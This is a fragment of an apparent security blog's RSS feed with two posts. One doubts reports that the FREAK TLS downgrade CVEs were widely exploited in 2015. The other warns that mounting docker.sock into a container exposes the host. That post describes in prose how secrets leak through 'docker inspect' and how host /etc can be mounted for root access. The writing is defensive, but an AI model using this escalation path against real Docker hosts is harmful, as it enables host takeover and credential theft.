  &lt;li&gt;2015-01-06 – CVE-2015-0204 – OpenSSL RSA Temporary Key Handling EXPORT_RSA Ciphers Downgrade MitM (FREAK)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These CVEs related to the &lt;a href=&quot;https://freakattack.com/&quot;&gt;TLS FREAK attack&lt;/a&gt; which is an SSL cipher downgrade issue.  They jumped out at me as I see these on tests quite a bit and frankly, they don’t generally get rated as that serious of an issue.&lt;/p&gt;

&lt;p&gt;To draw an analogy if it turns out that these were two of the most successful attacks of 2015, this is kind of like (to me) a scientist saying they’ve perfected &lt;strong&gt;cold fusion&lt;/strong&gt;! a) it’s very unlikely and b) if true it’s extremely significant and deserves a lot more prominence than a footnote in the DBIR!&lt;/p&gt;

&lt;h2 id=&quot;why-is-it-unlikely&quot;&gt;Why is it unlikely?&lt;/h2&gt;

&lt;p&gt;It’s unlikely because to exploit this issues there’s a number of pre-requisites that need to be satisfied.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;MiTM&lt;/strong&gt; - This is the big one.  This issue is only exploitable when the attacker can sit in a position to intercept and modify traffic between the client and the server.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Client + Server Vuln. required&lt;/strong&gt; - Unlike some of the other SSL vulnerabilities we’ve seen this requires a vulnerable client and server. Most popular browsers got patched for this pretty quickly (either via auto-update or monthly patch) so the window of attack for most users was pretty small.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Cryptographic Power&lt;/strong&gt;.  We’re talking about the ability to mass crack ciphers here.  Now they’re not strong ones (that’s the point of the attack) but still this is some endevour to do at scale.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Detecting Exploitation&lt;/strong&gt;.  To detect exploitation requires that the sensor can tell when the ciphersuite is downgraded,  the attacker cracks the key and then presumably carries out some follow-on attack.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;what-does-it-mean&quot;&gt;What does it mean?.&lt;/h2&gt;

&lt;p&gt;So lets assume these are indeed two of the most exploited vulnerabilities of 2015, what would that mean?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;There are a set of attackers who have MiTM positions to attack large numbers of clients and servers on the Internet&lt;/li&gt;
  &lt;li&gt;Those attackers have the processing power to mass-crack cryptographic keys gathered from intercepted connections presumably quickly enough to do something with the key in question.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If this is true that’s a pretty serious problem, as this set of attackers are hardly going to stop what they’re doing once the patch rate for FREAK improves as it did quite rapidly.&lt;/p&gt;

&lt;p&gt;Anyway, from the OSVDB blog I understand that Kenna are planning a explanatory blog posting, which I very much look forward to reading.  Things I would really like to see in that would be&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Details of how detection successful exploitation of FREAK was achieved.&lt;/li&gt;
  &lt;li&gt;Details on what the attack group did with this afterwards.&lt;/li&gt;
  &lt;li&gt;Details of what threat group carried out these attacks.&lt;/li&gt;
&lt;/ul&gt;
</description>
				<pubDate>Sat, 30 Apr 2016 07:50:39 +0100</pubDate>
				<link>/blog/2016/04/30/Verizon-DBIR-Vulns-And-Cold-Fusion/</link>
				<guid isPermaLink="true">/blog/2016/04/30/Verizon-DBIR-Vulns-And-Cold-Fusion/</guid>
			</item>
		
			<item>
				<title>The Dangers of Docker.sock</title>
				<description>&lt;p&gt;One of the things about Docker is that whilst it provides you with a sane set of defaults from a security persective, it’s still pretty easy to quickly reduce the level of security/isolation provided if you deviate from those defaults without understanding the consequences.&lt;/p&gt;

&lt;p&gt;At the moment the Docker Engine authorization model is pretty basic (although there’s now a plugin API available, so hopefully this will improve soon). Essentially a process which can access the docker socket (usually at /var/run/docker.sock) or who can connect to the HTTPS API, can execute any command that the docker service can run, which generally provides access to the whole host system as the docker service runs as root.&lt;/p&gt;

&lt;p&gt;Where this can trip you up is where you might want to provide access to the Docker socket to a container to allow a process running in that container to extract information about other containers running on the service. This is typically done by mounting the Docker socket into the container with a switch like &lt;code class=&quot;highlighter-rouge&quot;&gt;-v /var/run/docker.sock:/var/run/docker.sock&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;There are a couple of projects that I’ve noticed so far which do this, one of the more popular is &lt;a href=&quot;https://github.com/jwilder/nginx-proxy&quot;&gt;nginx-proxy&lt;/a&gt; which uses access to the Docker socket to allow it to automatically create reverse proxy entries for other containers.&lt;/p&gt;

&lt;p&gt;The only real access control that’s possible with this kind of set-up is that you can set the access to be read only (e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;-v /var/run/docker.sock:/var/run/docker.sock:ro&lt;/code&gt;), however this could still be risky, depending on your configuration as commands like &lt;code class=&quot;highlighter-rouge&quot;&gt;docker inspect&lt;/code&gt; can leak secret information about running containers. (Also see the &lt;strong&gt;update&lt;/strong&gt; below)&lt;/p&gt;

&lt;p&gt;For example the official &lt;a href=&quot;https://hub.docker.com/_/postgres/&quot;&gt;Docker postgres image&lt;/a&gt; provides a startup command of &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -d postgres&lt;/code&gt; which uses an environment variable to set the postgres password.  So if another container gets access to the docker socket, they can extract that password from docker inspect and then likely make a connection straight to your database (unless you’ve disabled &lt;a href=&quot;https://docs.docker.com/engine/userguide/networking/default_network/container-communication/&quot;&gt;Inter-container commmunication&lt;/a&gt; ).&lt;/p&gt;

&lt;p&gt;So in general I’d recommend thinking very carefully before making use of a Docker image that requires access to the Docker socket, even with read-only permissions as it could open your environment up to some additional risks. Hopefully with future developments on the Docker authorization model it’ll get easier to allow a container introspection in a less risky manner…&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; - After tweeting this article out @benhall &lt;a href=&quot;https://twitter.com/Ben_Hall/status/706879493135323136&quot;&gt;pointed out&lt;/a&gt; that actually the &lt;code class=&quot;highlighter-rouge&quot;&gt;ro&lt;/code&gt; setting on the volume mount doesn’t have a lot of effect in terms of security.  An attacker with ro access to the socket can still create another container and do something like mount /etc/ into it from the host, essentially giving them root access to the host.  So bottom line is don’t mount docker.sock into a container unless you trust its provenance and security…&lt;/p&gt;
</description>
				<pubDate>Sun, 06 Mar 2016 16:15:39 +0000</pubDate>
				<link>/blog/2016/03/06/The-Dangers-Of-Docker.sock/</link>
				<guid isPermaLink="true">/blog/2016/03/06/The-Dangers-Of-Docker.sock/</guid>
			</item>
		
	</channel>
</rss>
